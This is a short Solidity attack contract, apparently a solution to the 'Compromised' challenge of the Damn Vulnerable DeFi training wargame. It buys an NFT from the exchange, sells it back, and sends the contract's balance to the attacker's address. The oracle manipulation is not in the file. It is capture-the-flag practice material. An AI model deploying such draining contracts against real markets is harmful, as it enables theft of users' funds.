// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";
import "./Exchange.sol";
import "hardhat/console.sol";

contract PwnCompromised is IERC721Receiver {
    using Address for address payable;
    Exchange exchange;
    DamnValuableNFT token;
    address payable us;
    uint tokenId;
    constructor(address payable _exchange, address _token, address payable _us) {
	exchange = Exchange(_exchange);
	token = DamnValuableNFT(_token);
	us = _us;
    }

    function buy() external payable {
	tokenId = exchange.buyOne{value: msg.value}();
    }

    function sell() external {
	token.approve(address(exchange), tokenId);
	exchange.sellOne(tokenId);
	us.sendValue(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata) override public returns(bytes4) {
	console.log("ERC721 received");
	return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
